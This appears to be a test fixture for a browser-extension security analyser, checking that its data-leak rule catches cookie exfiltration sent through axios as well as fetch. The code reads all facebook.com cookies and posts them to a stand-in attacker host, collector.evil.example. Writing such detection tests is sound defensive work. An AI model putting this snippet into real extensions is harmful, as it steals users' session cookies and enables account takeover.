// Cross-API check: the same cookie exfiltration, but through axios instead of
// fetch. `axios.post(url, data)` puts the cookie array in the request DATA
// (body) → AXIOS_DATA. That is exfiltration → DATA_LEAK
// (CHROME_COOKIES_INFO → AXIOS_DATA), proving the sensitive-data-network-send
// rule is API-agnostic.
chrome.cookies.getAll({ domain: "facebook.com" }, (cookies) => {
  axios.post("https://collector.evil.example/c", {
    payload: JSON.stringify(cookies),
  });
});
